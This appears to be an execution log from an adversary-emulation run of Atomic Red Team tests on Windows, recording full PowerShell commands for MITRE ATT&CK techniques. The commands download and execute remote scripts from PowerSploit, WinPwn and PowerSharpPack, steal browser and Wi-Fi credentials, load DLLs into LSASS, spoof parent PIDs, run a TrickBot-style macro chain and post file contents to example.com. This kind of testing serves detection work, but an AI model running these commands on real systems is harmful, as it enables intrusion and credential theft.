 'description': 'Add a value to a Windows registry Security Support Provider '
                'pointing to a payload .dll which will normally need to be '
                'copied in the system32 folder.\n'
                'A common DLL used with this techquite is the minilib.dll from '
                'mimikatz, see '
                'https://pentestlab.blog/2019/10/21/persistence-security-support-provider/\n',
 'executor': 'psh',
 'link_id': '196fc6c9-0bdb-4dbf-afce-eebcb2beed9e',
 'name': 'Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa Security '
         'Support Provider configuration in registry',
 'pid': 4264,
 'plaintext_command': '$oldvalue = $(Get-ItemProperty '
                      'HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name '
                      "'Security Packages' | Select-Object -ExpandProperty "
                      "'Security Packages'); Set-ItemProperty -Path "
                      '"HKLM:\\System\\CurrentControlSet\\Control\\Lsa" -Name '
                      '\'Security Packages old\' -Value "$oldvalue"; $newvalue '
                      '= "AtomicTest.dll"; Set-ItemProperty '
                      'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name '
                      "'Security Packages' -Value $newvalue",
 'platform': 'windows',
 'run': '2023-12-02T06:40:30Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__431121fe12b6fd82938a9a52526b3423__trial_1

atomic_ordering: ['431121fe12b6fd82938a9a52526b3423']
------------------------------
{'ability_id': '431121fe12b6fd82938a9a52526b3423',
 'agent_reported_time': '2023-11-11T13:10:23Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.002',
            'technique_name': 'User Execution: Malicious File'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); $macrocode = "   Open '
            '`"C:\\Users\\Public\\art.jse`" For Output As #1`n   Write #1, '
            '`"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe '
            'C:\\Users\\Public\\art.jse`"`n"; Invoke-MalDoc -macroCode '
            '$macrocode -officeProduct "Word"',
 'delegated': '2023-11-30T14:21:46Z',
 'description': 'This Test uses a VBA macro to create and execute #{jse_path} '
                'with cscript.exe. Upon execution, the .jse file launches '
                'wscript.exe.\n'
                'Execution is handled by '
                '[Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) '
                'to load and execute VBA code into Excel or Word documents.\n'
                'This is a known execution chain observed by the OSTap '
                'downloader commonly used in TrickBot campaigns.\n'
                'References:\n'
                '  '
                'https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n',
 'executor': 'psh',
 'link_id': '8a16b9dc-bb95-4058-84c6-51307f007e65',
 'name': 'OSTap Style Macro Execution',
 'pid': 8872,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); $macrocode = "   Open '
                      '`"C:\\Users\\Public\\art.jse`" For Output As #1`n   '
                      'Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ '
                      '`"cscript.exe C:\\Users\\Public\\art.jse`"`n"; '
                      'Invoke-MalDoc -macroCode $macrocode -officeProduct '
                      '"Word"',
 'platform': 'windows',
 'run': '2023-11-30T14:22:10Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__a515bb54fd6e14b78297814875f3c73b__trial_1

atomic_ordering: ['a515bb54fd6e14b78297814875f3c73b']
------------------------------
{'ability_id': 'a515bb54fd6e14b78297814875f3c73b',
 'agent_reported_time': '2023-11-11T13:10:17Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.004',
            'technique_name': 'Access Token Manipulation: Parent PID Spoofing'},
 'command': '. "$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1"; '
            '$ppid=Get-Process explorer | select -expand id; PPID-Spoof -ppid '
            '$ppid -spawnto "C:\\Program Files\\Internet '
            'Explorer\\iexplore.exe" -dllpath "8b38ee_calc.dll"',
 'delegated': '2023-11-30T08:34:45Z',
 'description': 'This test uses PowerShell to replicates how Cobalt Strike '
                'does ppid spoofing and masquerade a spawned process.\n'
                'Upon execution, "Process C:\\Program Files\\Internet '
                'Explorer\\iexplore.exe is spawned with pid ####" will be '
                'displayed and\n'
                'calc.exe will be launched.\n'
                '\n'
                'Credit to In Ming Loh '
                '(https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n',
 'executor': 'psh',
 'link_id': '3af14fe8-2400-4d93-8679-a90b83ccb2e2',
 'name': 'Parent PID Spoofing using PowerShell',
 'pid': 10456,
 'plaintext_command': '. '
                      '"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1"; '
                      '$ppid=Get-Process explorer | select -expand id; '
                      'PPID-Spoof -ppid $ppid -spawnto "C:\\Program '
                      'Files\\Internet Explorer\\iexplore.exe" -dllpath '
                      '"8b38ee_calc.dll"',
 'platform': 'windows',
 'run': '2023-11-30T08:35:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_008__multiple__boot_or_logon_autostart_execution-_lsass_driver__4572792b7173c41d22a827610b8f8890__trial_1

atomic_ordering: ['4572792b7173c41d22a827610b8f8890']
------------------------------
{'ability_id': '4572792b7173c41d22a827610b8f8890',
 'agent_reported_time': '2023-11-11T13:10:39Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.008',
            'technique_name': 'Boot or Logon Autostart Execution: LSASS '
                              'Driver'},
 'command': 'New-ItemProperty -Path '
            'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt '
            '-Value "PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll"',
 'delegated': '2023-12-02T07:38:58Z',
 'description': 'The following Atomic will modify an undocumented registry key '
                'that may be abused to load a arbitrary DLL into LSASS. \n'
                '\n'
                'Upon execution, the registry key will be modified and a value '
                'will contain the path to the DLL. \n'
                'Reference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ '
                'and source https://github.com/oxfemale/LogonCredentialsSteal\n'
                'Note that if any LSA based protection is enabled, this will '
                'most likely not be successful with LSASS.exe loading the '
                'DLL.\n',
 'executor': 'psh',
 'link_id': '56101193-0a63-447e-a5b9-1b80d3a8c65e',
 'name': 'Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt',
 'pid': 1028,
 'plaintext_command': 'New-ItemProperty -Path '
                      'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name '
                      'LsaDbExtPt -Value '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll"',
 'platform': 'windows',
 'run': '2023-12-02T07:39:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555__credential-access__credentials_from_password_stores__c7aa16aea441e7bec9a6391af601acc9__trial_1

atomic_ordering: ['c7aa16aea441e7bec9a6391af601acc9']
------------------------------
{'ability_id': 'c7aa16aea441e7bec9a6391af601acc9',
 'agent_reported_time': '2023-11-11T13:10:16Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555',
            'technique_name': 'Credentials from Password Stores'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'wificreds -consoleoutput -noninteractive',
 'delegated': '2023-12-03T02:47:26Z',
 'description': 'Loot local Credentials - Wifi Credentials technique via '
                'function of WinPwn',
 'executor': 'psh',
 'link_id': '44868699-5ece-4170-8ad1-bf842a67302f',
 'name': 'WinPwn - Loot local Credentials - Wifi Credentials',
 'pid': 8432,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'wificreds -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-12-03T02:47:40Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__ffe23675b3b68eb6d2b6e771451de3af__trial_1

atomic_ordering: ['ffe23675b3b68eb6d2b6e771451de3af']
------------------------------
{'ability_id': 'ffe23675b3b68eb6d2b6e771451de3af',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.002',
            'technique_name': 'Account Discovery: Domain Account'},
 'command': '$target = $env:LOGONSERVER; $target = $target.Trim("\\\\"); '
            '$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select '
            'IPAddressToString -ExpandProperty IPAddressToString; wmic.exe '
            "/node:$IpAddress process call create 'wevtutil epl Security "
            'C:\\\\ntlmusers.evtx /q:\\"Event[System[(EventID=4776)]]"\'',
 'delegated': '2023-11-29T08:28:42Z',
 'description': 'This test discovers users who have authenticated against a '
                'Domain Controller via NTLM. \n'
                'This is done remotely via wmic and captures the event code '
                '4776 from the domain controller and stores the ouput in '
                'C:\\temp. '
                '[Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n',
 'executor': 'psh',
 'link_id': '57a27664-57a3-4f8e-9f4f-3a4183d118df',
 'name': 'Wevtutil - Discover NTLM Users Remote',
 'pid': 1444,
 'plaintext_command': '$target = $env:LOGONSERVER; $target = '
                      '$target.Trim("\\\\"); $IpAddress = '
                      '[System.Net.Dns]::GetHostAddresses($target) | select '
                      'IPAddressToString -ExpandProperty IPAddressToString; '
                      "wmic.exe /node:$IpAddress process call create 'wevtutil "
                      'epl Security C:\\\\ntlmusers.evtx '
                      '/q:\\"Event[System[(EventID=4776)]]"\'',
 'platform': 'windows',
 'run': '2023-11-29T08:29:00Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__b26ce33f4cd29428f619fc600e052350__trial_1

atomic_ordering: ['b26ce33f4cd29428f619fc600e052350']
------------------------------
{'ability_id': 'b26ce33f4cd29428f619fc600e052350',
 'agent_reported_time': '2023-11-11T13:10:08Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.004',
            'technique_name': 'Signed Binary Proxy Execution: InstallUtil'},
 'command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; } else '
            '{New-Item -Type Directory (split-path '
            '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction ignore | '
            'Out-Null; Invoke-WebRequest '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
            '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
            '"eaecbe_InstallUtilTestHarness.ps1"; $InstallerAssemblyDir = '
            '"$Env:TEMP\\"; $InstallerAssemblyFileName = "T1218.004.dll"; '
            '$InstallerAssemblyFullPath = Join-Path -Path '
            '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; '
            '$CommandLine = "/? `"$InstallerAssemblyFullPath`""; '
            "$ExpectedOutput = 'Constructor_HelpText_'; $TestArgs = @{;     "
            'OutputAssemblyDirectory = $InstallerAssemblyDir;     '
            'OutputAssemblyFileName = $InstallerAssemblyFileName;     '
            "InvocationMethod = 'Executable';     CommandLine = $CommandLine; "
            '}; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
            '@TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw '
            '@"; InstallUtil HelpText property execution test failure. '
            'Installer assembly execution output did not match the expected '
            'output.; Expected: $ExpectedOutput; Actual: $ActualOutput; "@; }',
 'delegated': '2023-11-30T21:29:38Z',
 'description': 'Executes the Uninstall Method. Upon execution, help '
                'information will be displayed for InstallUtil.\n',
 'executor': 'psh',
 'link_id': 'fba1af72-fed0-4c7c-a6db-25c33a41e56d',
 'name': 'InstallUtil HelpText method call',
 'pid': 8936,
 'plaintext_command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; '
                      '} else {New-Item -Type Directory (split-path '
                      '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction '
                      'ignore | Out-Null; Invoke-WebRequest '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                      '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
                      '"eaecbe_InstallUtilTestHarness.ps1"; '
                      '$InstallerAssemblyDir = "$Env:TEMP\\"; '
                      '$InstallerAssemblyFileName = "T1218.004.dll"; '
                      '$InstallerAssemblyFullPath = Join-Path -Path '
                      '$InstallerAssemblyDir -ChildPath '
                      '$InstallerAssemblyFileName; $CommandLine = "/? '
                      '`"$InstallerAssemblyFullPath`""; $ExpectedOutput = '
                      "'Constructor_HelpText_'; $TestArgs = @{;     "
                      'OutputAssemblyDirectory = $InstallerAssemblyDir;     '
                      'OutputAssemblyFileName = '
                      '$InstallerAssemblyFileName;     InvocationMethod = '
                      "'Executable';     CommandLine = $CommandLine; }; "
                      '$ActualOutput = '
                      'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if '
                      '($ActualOutput -ne $ExpectedOutput) {;     throw @"; '
                      'InstallUtil HelpText property execution test failure. '
                      'Installer assembly execution output did not match the '
                      'expected output.; Expected: $ExpectedOutput; Actual: '
                      '$ActualOutput; "@; }',
 'platform': 'windows',
 'run': '2023-11-30T21:29:57Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1518_001__discovery__software_discovery-_security_software_discovery__36a790779a43eb407e4852726be0c66e__trial_1

atomic_ordering: ['36a790779a43eb407e4852726be0c66e']
------------------------------
{'ability_id': '36a790779a43eb407e4852726be0c66e',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1518.001',
            'technique_name': 'Software Discovery: Security Software '
                              'Discovery'},
 'command': 'Get-NetFirewallProfile | Format-Table Name, Enabled; '
            'Get-NetFirewallSetting; Get-NetFirewallRule | select DisplayName, '
            'Enabled, Description',
 'delegated': '2023-12-01T12:59:11Z',
 'description': 'Enumerates windows firewall to retrieves firewall rules from '
                'the target computer.\n'
                '\n'
                'when sucessfully executed, details of windows firewall is '
                'displayed.\n',
 'executor': 'psh',
 'link_id': '90cadc8b-93db-4eb0-a452-875055e7fd7b',
 'name': 'Security Software Discovery - Windows Firewall Enumeration',
 'pid': 5588,
 'plaintext_command': 'Get-NetFirewallProfile | Format-Table Name, Enabled; '
                      'Get-NetFirewallSetting; Get-NetFirewallRule | select '
                      'DisplayName, Enabled, Description',
 'platform': 'windows',
 'run': '2023-12-01T12:59:43Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__5610bf38f44ad2da2ecb846ba776ecdc__trial_1

atomic_ordering: ['5610bf38f44ad2da2ecb846ba776ecdc']
------------------------------
{'ability_id': '5610bf38f44ad2da2ecb846ba776ecdc',
 'agent_reported_time': '2023-11-11T13:10:30Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': '$PasswordDBLocation = get-childitem -path '
            '"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\"; '
            'cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py -d '
            '$PasswordDBLocation > $env:temp\\T1555.003Test8.txt; cat '
            '$env:temp\\T1555.003Test8.txt',
 'delegated': '2023-12-02T22:13:58Z',
 'description': 'Firepwd.py is a script that can decrypt Mozilla (Thunderbird, '
                'Firefox) passwords.\n'
                'Upon successful execution, the decrypted credentials will be '
                'output to a text file, as well as displayed on screen. \n',
 'executor': 'psh',
 'link_id': 'd8fd4853-0f55-494f-9252-e45608ddc1e0',
 'name': 'Decrypt Mozilla Passwords with Firepwd.py',
 'pid': 9660,
 'plaintext_command': '$PasswordDBLocation = get-childitem -path '
                      '"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\"; '
                      'cmd /c '
                      'PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py '
                      '-d $PasswordDBLocation > $env:temp\\T1555.003Test8.txt; '
                      'cat $env:temp\\T1555.003Test8.txt',
 'platform': 'windows',
 'run': '2023-12-02T22:14:40Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1041__exfiltration__exfiltration_over_c2_channel__72784d12700b219ec134aa42cec5603e__trial_1

atomic_ordering: ['72784d12700b219ec134aa42cec5603e']
------------------------------
{'ability_id': '72784d12700b219ec134aa42cec5603e',
 'agent_reported_time': '2023-11-11T13:10:54Z',
 'attack': {'tactic': 'exfiltration',
            'technique_id': 'T1041',
            'technique_name': 'Exfiltration Over C2 Channel'},
 'command': 'if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   1..100 | '
            'ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt '
            '-Value "This is line $_." }; }; '
            '[System.Net.ServicePointManager]::Expect100Continue = $false; '
            '$filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt; '
            'Invoke-WebRequest -Uri example.com -Method POST -Body '
            '$filecontent -DisableKeepAlive',
 'delegated': '2023-11-27T17:08:03Z',
 'description': 'Exfiltrates a file present on the victim machine to the C2 '
                'server.\n',
 'executor': 'psh',
 'link_id': '4445bcfd-b73b-432d-8293-5c4dc26ef975',
 'name': 'C2 Data Exfiltration',
 'pid': 8080,
 'plaintext_command': 'if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   '
                      '1..100 | ForEach-Object { Add-Content -Path '
                      '$env:TEMP\\LineNumbers.txt -Value "This is line $_." }; '
                      '}; [System.Net.ServicePointManager]::Expect100Continue '
                      '= $false; $filecontent = Get-Content -Path '
                      '$env:TEMP\\LineNumbers.txt; Invoke-WebRequest -Uri '
                      'example.com -Method POST -Body $filecontent '
                      '-DisableKeepAlive',
 'platform': 'windows',
 'run': '2023-11-27T17:08:51Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__ba763ea19604a73e3e1f9d9d8d86d9cc__trial_1

atomic_ordering: ['ba763ea19604a73e3e1f9d9d8d86d9cc']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__a9faa0d792d6bc2660b05e7650d2736d__trial_1

atomic_ordering: ['a9faa0d792d6bc2660b05e7650d2736d']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1cca72410c2849070d833700fcc30c59__trial_1

atomic_ordering: ['1cca72410c2849070d833700fcc30c59']
------------------------------
{'ability_id': '1cca72410c2849070d833700fcc30c59',
 'agent_reported_time': '2023-11-11T13:10:24Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': 'Copy-Item "$env:APPDATA\\Opera Software\\Opera Stable\\Login '
            'Data" -Destination "PathToAtomicsFolder\\..\\ExternalPayloads"',
 'delegated': '2023-12-02T21:36:23Z',
 'description': 'Simulates an adversary accessing encrypted credentials from '
                "Opera web browser's login database. \n",
 'executor': 'psh',
 'link_id': '1e4b1fae-4a47-4a89-bf57-20446e8aa0d7',
 'name': 'Simulating access to Opera Login Data',
 'pid': 6480,
 'plaintext_command': 'Copy-Item "$env:APPDATA\\Opera Software\\Opera '
                      'Stable\\Login Data" -Destination '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads"',
 'platform': 'windows',
 'run': '2023-12-02T21:36:52Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1491_001__impact__defacement-_internal_defacement__90adc98ddf396bb7cb3b90a1f090a0e0__trial_1

atomic_ordering: ['90adc98ddf396bb7cb3b90a1f090a0e0']
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__0a96ef5851da1be487cebdd9a1f86b7a__trial_1

atomic_ordering: ['0a96ef5851da1be487cebdd9a1f86b7a']
------------------------------
{'ability_id': '0a96ef5851da1be487cebdd9a1f86b7a',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
            '-UseBasicParsing); Find-GPOComputerAdmin -ComputerName '
            '$env:COMPUTERNAME -Verbose"',
 'delegated': '2023-11-28T12:47:59Z',
 'description': 'takes a computer and determines who has admin rights over it '
                'through GPO enumeration. Upon execution, information about '
                'the machine will be displayed.\n',
 'executor': 'psh',
 'link_id': 'f9cf5aea-9f69-44f2-b152-1d499f3593da',
 'name': 'Find Local Admins via Group Policy (PowerView)',
 'pid': 6340,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Find-GPOComputerAdmin -ComputerName '
                      '$env:COMPUTERNAME -Verbose"',
 'platform': 'windows',
 'run': '2023-11-28T12:48:06Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1018__discovery__remote_system_discovery__c75a55384a1e7026bb91f841e4ca2ba9__trial_1

atomic_ordering: ['c75a55384a1e7026bb91f841e4ca2ba9']
------------------------------
{'ability_id': 'c75a55384a1e7026bb91f841e4ca2ba9',
 'agent_reported_time': '2023-11-11T13:09:55Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1018',
            'technique_name': 'Remote System Discovery'},
 'command': '([adsisearcher]"objectcategory=computer").FindAll(); '
            '([adsisearcher]"objectcategory=computer").FindOne()',
 'delegated': '2023-11-27T08:04:09Z',
 'description': 'The following Atomic test will utilize ADSISearcher to '
                'enumerate computers within Active Directory.\n'
                'Upon successful execution a listing of computers will output '
                'with their paths in AD.\n'
                'Reference: '
                'https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n',
 'executor': 'psh',
 'link_id': 'bc46acc1-5391-4d6f-913e-13b0e7f27ce6',
 'name': 'Enumerate Active Directory Computers with ADSISearcher',
 'pid': 6640,
 'plaintext_command': '([adsisearcher]"objectcategory=computer").FindAll(); '
                      '([adsisearcher]"objectcategory=computer").FindOne()',
 'platform': 'windows',
 'run': '2023-11-27T08:04:30Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__aee64e494f7adfb1867d67f7ee08e5c6__trial_1

atomic_ordering: ['aee64e494f7adfb1867d67f7ee08e5c6']
------------------------------
{'ability_id': 'aee64e494f7adfb1867d67f7ee08e5c6',
 'agent_reported_time': '2023-11-11T13:10:14Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); "
            'Invoke-Sharpweb -command "all"',
 'delegated': '2023-12-02T23:51:35Z',
 'description': 'PowerSharpPack - Sharpweb searching for Browser Credentials '
                'technique via function of WinPwn',
 'executor': 'psh',
 'link_id': '1bfccdb0-f4a4-47f6-bc85-73df81026826',
 'name': 'WinPwn - PowerSharpPack - Sharpweb for Browser Credentials',
 'pid': 9936,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); "
                      'Invoke-Sharpweb -command "all"',
 'platform': 'windows',
 'run': '2023-12-02T23:51:54Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1112__defense-evasion__modify_registry__1296157a99b29c9a81fb1ce4eaf24cbd__trial_1

atomic_ordering: ['1296157a99b29c9a81fb1ce4eaf24cbd']
------------------------------
{'ability_id': '1296157a99b29c9a81fb1ce4eaf24cbd',
 'agent_reported_time': '2023-11-11T13:09:40Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1112',
            'technique_name': 'Modify Registry'},
 'command': 'Set-ItemProperty -Path '
            "'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet "
            "Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0; "
            'Set-ItemProperty -Path '
            "'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet "
            "Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0",
 'delegated': '2023-11-29T23:35:12Z',
 'description': 'This test simulates an adversary modifying the Internet Zone '
                'Protocol Defaults in the registry of the currently logged-in '
                'user using PowerShell. Such modifications can be indicative '
                'of an adversary attempting to weaken browser security '
                'settings. \n'
                'To verify the effects of the test:\n'
                '1. Open the Registry Editor (regedit.exe).\n'
                '2. Navigate to '
                '"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet '
                'Settings\\ZoneMap\\ProtocolDefaults".\n'
                '3. Check for the presence of the "http" and "https" DWORD '
                'values set to `0`.\n'
                'Or run:\n'
                '```powershell\n'
                'Get-ItemProperty -Path '
                "'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet "
                "Settings\\ZoneMap\\ProtocolDefaults' | Select-Object "
                'http,https\n'
                '```\n',
 'executor': 'psh',
 'link_id': '6e97d22e-8b2b-48e9-885f-8a567c6243c9',
 'name': 'Modify Internet Zone Protocol Defaults in Current User Registry - '
         'PowerShell',
 'pid': 6896,
 'plaintext_command': 'Set-ItemProperty -Path '
                      "'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet "
                      "Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' "
                      '-Value 0; Set-ItemProperty -Path '
                      "'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet "
                      "Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' "
                      '-Value 0',
 'platform': 'windows',
 'run': '2023-11-29T23:35:17Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__04858322bc6cd08282f2ce96cab5ee7c__trial_1

atomic_ordering: ['04858322bc6cd08282f2ce96cab5ee7c']
------------------------------
{'ability_id': '04858322bc6cd08282f2ce96cab5ee7c',
 'agent_reported_time': '2023-11-11T13:10:41Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.004',
            'technique_name': 'Indicator Removal on Host: File Deletion'},
 'command': 'Remove-Item -path $env:TEMP\\deleteme_T1551.004',
 'delegated': '2023-11-28T17:17:48Z',
 'description': 'Delete a single file from the temporary directory using '
                'Powershell. Upon execution, no output will be displayed. Use '
                'File Explorer to verify the file was deleted.\n',
 'executor': 'psh',
 'link_id': '67645e8d-3e39-458a-b328-570a6522fbf9',
 'name': 'Delete a single file - Windows PowerShell',
 'pid': 10224,
 'plaintext_command': 'Remove-Item -path $env:TEMP\\deleteme_T1551.004',
 'platform': 'windows',
 'run': '2023-11-28T17:18:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__84a93e5157b690ee0f585cd55c15b0cb__trial_1

atomic_ordering: ['84a93e5157b690ee0f585cd55c15b0cb']
------------------------------
{'ability_id': '84a93e5157b690ee0f585cd55c15b0cb',
 'agent_reported_time': '2023-11-11T13:09:46Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
            '-UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose',
 'delegated': '2023-11-28T14:24:10Z',
 'description': 'Enumerates members of the local Administrators groups across '
                'all machines in the domain. Upon execution, information about '
                'each machine will be displayed.\n',
 'executor': 'psh',
 'link_id': 'b1ae756f-60c8-4007-9b4c-49b56297dff2',
 'name': 'Find local admins on all machines in domain (PowerView)',
 'pid': 4912,
